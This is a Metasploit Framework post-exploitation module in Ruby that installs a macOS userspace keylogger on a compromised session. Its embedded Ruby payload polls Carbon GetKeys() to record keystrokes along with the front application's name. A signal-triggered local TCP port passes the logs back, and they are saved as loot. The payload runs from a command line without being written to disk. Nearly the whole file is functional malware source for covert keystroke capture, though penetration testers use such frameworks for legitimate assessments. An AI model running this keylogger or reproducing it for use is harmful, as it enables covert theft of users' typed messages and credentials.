##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'shellwords'

class Metasploit3 < Msf::Post
	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Auxiliary::Report

	# when we need to read from the keylogger,
	# we first "knock" the process by sending a USR1 signal.
	# the keylogger opens a local tcp port (22899 by default) momentarily
	# that we can connect to and read from (using cmd_exec(telnet ...)).
	attr_accessor :port

	# the pid of the keylogger process
	attr_accessor :pid

	# where we are storing the keylog
	attr_accessor :loot_path


	def initialize(info={})
		super(update_info(info,
			'Name'          => 'OSX Capture Userspace Keylogger',
			'Description'   => %q{
				This module logs all keyboard events except cmd-keys and GUI password input.

				Keylogs are transferred between client/server in chunks
				every SYNCWAIT seconds for reliability.

				It works by calling the Carbon GetKeys() hook using the DL lib
				in OSX's system Ruby. The Ruby code is executed in a shell
				command using -e, so the payload never hits the disk.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'joev <jvennix[at]rapid7.com>'],
			'Platform'      => [ 'osx'],
			'SessionTypes'  => [ 'shell', 'meterpreter' ]
		))

		register_options(
			[
				OptInt.new('DURATION',
					[ true, 'The duration in seconds.', 600 ]
				),
				OptInt.new('SYNCWAIT',
					[ true, 'The time between transferring log chunks.', 10 ]
				),
				OptPort.new('LOGPORT',
					[ false, 'Local port opened for momentarily for log transfer', 22899 ]
				)
			]
		)
	end

	def run_ruby_code
		# to pass args to ruby -e we use ARGF (stdin) and yaml
		opts = {
			:duration => datastore['DURATION'].to_i,
			:port => self.port
		}
		cmd = ['ruby', '-e', ruby_code(opts)]

		rpid = cmd_exec(cmd.shelljoin, nil, 10)

		if rpid =~ /^\d+/
			print_status "Ruby process executing with pid #{rpid.to_i}"
			rpid.to_i
		else
			fail_with(Exploit::Failure::Unknown, "Ruby keylogger command failed with error #{rpid}")
		end
	end


	def run
		if session.nil?
			print_error "Invalid SESSION id."
			return
		end

		if datastore['DURATION'].to_i < 1
			print_error 'Invalid DURATION value.'
			return
		end

		print_status "Executing ruby command to start keylogger process."

		@port = datastore['LOGPORT'].to_i
		@pid = run_ruby_code

		begin
			Timeout.timeout(datastore['DURATION']+5) do # padding to read the last logs
				print_status "Entering read loop"
				while true
					print_status "Waiting #{datastore['SYNCWAIT']} seconds."
					Rex.sleep(datastore['SYNCWAIT'])
					print_status "Sending USR1 signal to open TCP port..."
					cmd_exec("kill -USR1 #{self.pid}")
					print_status "Dumping logs..."
					log = cmd_exec("telnet localhost #{self.port}")
					log_a = log.scan(/^\[.+?\] \[.+?\] .*$/)
					log = log_a.join("\n")+"\n"
					print_status "#{log_a.size} keystrokes captured"
					if log_a.size > 0
						if self.loot_path.nil?
							self.loot_path = store_loot(
								"keylog", "text/plain", session, log, "keylog.log", "OSX keylog"
							)
						else
							File.open(self.loot_path, 'ab') { |f| f.write(log) }
						end
						print_status(log_a.map{ |a| a=~/([^\s]+)\s*$/; $1 }.join)
						print_status "Saved to #{self.loot_path}"
					end
				end
			end
		rescue ::Timeout::Error
			print_status "Keylogger run completed."
		end
	end


	def kill_process(pid)
		print_status "Killing process #{pid.to_i}"
		cmd_exec("kill #{pid.to_i}")
	end

	def cleanup
		return if session.nil?
		return if not @cleaning_up.nil?
		@cleaning_up = true

		if self.pid.to_i > 0
			print_status("Cleaning up...")
			kill_process(self.pid)
		end
	end

	def ruby_code(opts={})
		<<-EOS
# Kick off a child process and let parent die
child_pid = fork do
  require 'thread'
  require 'dl'
  require 'dl/import'


  options = {
    :duration => #{opts[:duration]},
    :port => #{opts[:port]}
  }


  #### Patches to DL (for compatibility between 1.8->1.9)

  Importer = if defined?(DL::Importer) then DL::Importer else DL::Importable end

  def ruby_1_9_or_higher?
    RUBY_VERSION.to_f >= 1.9
  end

  def malloc(size)
    if ruby_1_9_or_higher?
      DL::CPtr.malloc(size)
    else
      DL::malloc(size)
    end
  end

  # the old Ruby Importer defaults methods to downcase every import
  # This is annoying, so we'll patch with method_missing
  if not ruby_1_9_or_higher?
    module DL
      module Importable
        def method_missing(meth, *args, &block)
          str = meth.to_s
          lower = str[0,1].downcase + str[1..-1]
          if self.respond_to? lower
            self.send lower, *args
          else
            super
          end
        end
      end
    end
  end

  #### 1-way IPC ####

  log = ''
  log_semaphore = Mutex.new
  Signal.trap("USR1") do # signal used for port knocking
    if not @server_listening
      @server_listening = true
      Thread.new do
        require 'socket'
        server = TCPServer.new(options[:port])
        client = server.accept
        log_semaphore.synchronize do
          client.puts(log+"\n\r")
          log = ''
        end
        client.close
        server.close
        @server_listening = false
      end
    end
  end

  #### External dynamically linked code

  SM_KCHR_CACHE = 38
  SM_CURRENT_SCRIPT = -2
  MAX_APP_NAME = 80

  module Carbon
    extend Importer
    dlload 'Carbon.framework/Carbon'
    extern 'unsigned long CopyProcessName(const ProcessSerialNumber *, void *)'
    extern 'void GetFrontProcess(ProcessSerialNumber *)'
    extern 'void GetKeys(void *)'
    extern 'unsigned char *GetScriptVariable(int, int)'
    extern 'unsigned char KeyTranslate(void *, int, void *)'
    extern 'unsigned char CFStringGetCString(void *, void *, int, int)'
    extern 'int CFStringGetLength(void *)'
  end

  psn = malloc(16)
  name = malloc(16)
  name_cstr = malloc(MAX_APP_NAME)
  keymap = malloc(16)
  state = malloc(8)

  #### Actual Keylogger code

  itv_start = Time.now.to_i
  prev_down = Hash.new(false)

  while (true) do
    Carbon.GetFrontProcess(psn.ref)
    Carbon.CopyProcessName(psn.ref, name.ref)
    Carbon.GetKeys(keymap)

    str_len = Carbon.CFStringGetLength(name)
    copied = Carbon.CFStringGetCString(name, name_cstr, MAX_APP_NAME, 0x08000100) > 0
    app_name = if copied then name_cstr.to_s else 'Unknown' end

    bytes = keymap.to_str
    cap_flag = false
    ascii = 0

    (0...128).each do |k|
      # pulled from apple's developer docs for Carbon#KeyMap/GetKeys
      if ((bytes[k>>3].ord >> (k&7)) & 1 > 0)
        if not prev_down[k]
          kchr = Carbon.GetScriptVariable(SM_KCHR_CACHE, SM_CURRENT_SCRIPT)
          curr_ascii = Carbon.KeyTranslate(kchr, k, state)
          curr_ascii = curr_ascii >> 16 if curr_ascii < 1
          prev_down[k] = true
          if curr_ascii == 0
            cap_flag = true
          else
            ascii = curr_ascii
          end
        end
      else
      	prev_down[k] = false
      end
    end

    if ascii != 0 # cmd/modifier key. not sure how to look this up. assume shift.
      log_semaphore.synchronize do
        if ascii > 32 and ascii < 127
          c = if cap_flag then ascii.chr.upcase else ascii.chr end
          log = log << "[\#{Time.now.to_i}] [\#{app_name}] \#{c}\n"
        else
          log = log << "[\#{Time.now.to_i}] [\#{app_name}] [\#{ascii}]\\n"
        end
      end
    end

    exit if Time.now.to_i - itv_start > options[:duration]
    Kernel.sleep(0.01)
  end
end

puts child_pid
Process.detach(child_pid)

EOS
	end
end

